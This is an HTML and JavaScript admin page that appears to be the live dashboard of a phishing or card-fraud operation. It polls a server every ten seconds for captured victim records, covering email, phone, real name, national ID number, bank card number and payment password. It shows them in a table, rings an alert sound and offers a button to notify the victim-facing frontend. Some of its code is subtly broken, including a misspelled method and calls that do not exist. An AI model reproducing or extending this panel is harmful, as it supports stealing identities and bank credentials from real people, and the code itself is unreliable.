<table class="table table-striped table-bordered table-hover">
    <thead>
        <tr>
            <th>ID</th>
            <th>终端类型</th>
            <th>邮箱</th>
            <th>电话号码</th>
            <th>真实姓名</th>
            <th>身份证号</th>
            <th>银行卡号</th>
            <th>支付密码</th>
            <th>操作</th>
        </tr>
    </thead>
    <tbody>
    </tbody>
    <tfoot>
    </tfoot>
</table>
<div id="noticeItems" style="height: 300px; overflow-y: auto;">
</div>
<audio id="audioNotice" src="http://www.w3school.com.cn/i/song.mp3" controls="controls" style="display:none;">

</audio>

<script type="text/javascript">
    Date.prototype.Format = function (fmt) { //author: meizz
        var o = {
            "M+": this.getMonth() + 1, //月份
            "d+": this.getDate(), //日
            "h+": this.getHours(), //小时
            "m+": this.getMinutes(), //分
            "s+": this.getSeconds(), //秒
            "q+": Math.floor((this.getMonth() + 3) / 3), //季度
            "S": this.getMilliseconds() //毫秒
        };
        if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
        for (var k in o)
            if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
        return fmt;
    }

    $(function () {
        setInterval("refresh()", 1000 * 10);

        $('tbody').delegate('a[role=btnNotice]', 'click', function(){
            var a = $(this);
            $.post('/admin/api/notice_client/' + a.parets('tr').attr('data-id') + '.json',
                function (data) {
                    if(data.status == 'err'){
                        return;
                    }

                    a.parents('tr').remove();
                }, 'json');
        });
    });
    
    function refresh() {
        $.get('/admin/api/new_msg.json',
            function (data) {

                if(data.status == 'err'){
                    $('#noticeItems').append('<p>[' + new Date().Format("yyyy-MM-dd hh:mm:ss") + ']未获取新消息</p>');
                    return;
                }

                $('#noticeItems').append('<p style="color:red;">[' + new Date().Format("yyyy-MM-dd hh:mm:ss") + ']有新消息</p>');

                var items = data.data;
                for(var key in items){
                    var json = JSON.parse(items[key].otherData);
                    $(tbody).append('<tr  data-id=' + json.id + '>' +
                        '<td>' + json.id + '</td>' +
                        '<td>' + (json.has("deviceid") ? json.deviceid : "") + '</td>' +
                        '<td>' + (json.has("email") ? json.email : "") + '</td>' +
                        '<td>' + (json.has("linkphone") ? json.linkphone : "") + '</td>' +
                        '<td>' + (json.has("realname") ? json.realname : "") + '</td>' +
                        '<td>' + (json.has("idcode") ? json.idcode : "") + '</td>' +
                        '<td>' + (json.has("bankcard") ? json.bankcard : "") + '</td>' +
                        '<td>' + (json.has("paypwd") ? json.paypwd : "") + '</td>' +
                        '<td>' +
                        '<a class="btn btn-primary" role="btnNotice">通知前端</a>' +
                        '</td>' +
                        '</tr>');

                }

                playBell();
            }, 'json');
    }

    function playBell() {
        document.getElementById('audioNotice').play();
    }
</script>

